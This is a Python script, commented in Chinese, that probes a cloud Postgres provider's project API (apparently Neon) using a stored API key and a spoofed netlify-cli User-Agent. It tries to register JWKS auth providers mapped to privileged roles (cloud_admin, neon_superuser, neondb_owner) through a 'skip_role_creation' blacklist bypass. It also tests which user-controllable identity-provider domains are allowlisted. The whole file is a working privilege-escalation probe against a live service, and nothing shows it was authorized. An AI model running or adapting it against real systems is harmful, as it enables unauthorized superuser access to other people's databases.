# -*- coding: utf-8 -*-
"""最后探测:skip_role_creation 绕过黑名单?白名单 IdP 域名试探"""
import http.client, ssl, json, time
ctx = ssl.create_default_context()
P = 'orange-sun-90493739'
key = json.load(open(r'D:\scan\neon_report\_apikey.json'))['key']
from _neon_creds_stage import API_HOST, API_BASE, HEADERS_TEST

def req(method, path, body=None, tmo=15):
    conn = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=tmo)
    h = {'User-Agent': 'netlify-cli/17.0.0', 'Accept': 'application/json', 'Content-Type': 'application/json',
         'Authorization': 'Bearer ' + key}
    h.update(HEADERS_TEST)
    conn.request(method, API_BASE + path, body=json.dumps(body).encode() if body is not None else None, headers=h)
    r = conn.getresponse(); raw = r.read()
    st = r.status; conn.close()
    return st, raw

# 1) skip_role_creation=True 时特权角色名是否被放行
vecs = [
    ('skip+cloud_admin', {'role_names': ['cloud_admin'], 'skip_role_creation': True}),
    ('skip+neon_superuser', {'role_names': ['neon_superuser'], 'skip_role_creation': True}),
    ('skip+neondb_owner', {'role_names': ['neondb_owner'], 'skip_role_creation': True}),
]
for name, extra in vecs:
    body = {'jwks_url': 'https://www.googleapis.com/oauth2/v3/certs', 'provider_name': 'sec5-%s' % name[:10]}
    body.update(extra)
    st, raw = req('POST', '/projects/%s/jwks' % P, body)
    msg = raw[:200].decode(errors='replace')
    print('[%s] -> %d | %s' % (name, st, msg), flush=True)
    time.sleep(1)

# 2) 白名单域名试探(用户可自控签名的 IdP)
for name, url in [
    ('clerk', 'https://sec-test-zzz.clerk.accounts.dev/.well-known/jwks.json'),
    ('auth0', 'https://sec-test-zzz.us.auth0.com/.well-known/jwks.json'),
    ('okta', 'https://sec-test-zzz.okta.com/oauth2/v1/keys'),
    ('workos', 'https://api.workos.com/sso/jwks/sec-test-zzz'),
    ('keycloak', 'https://auth.sec-test-zzz.com/realms/x/protocol/openid-connect/certs'),
]:
    st, raw = req('POST', '/projects/%s/jwks' % P, {'jwks_url': url, 'provider_name': 'sec6-%s' % name})
    msg = raw[:160].decode(errors='replace')
    print('[%s] -> %d | %s' % (name, st, msg), flush=True)
    time.sleep(1)
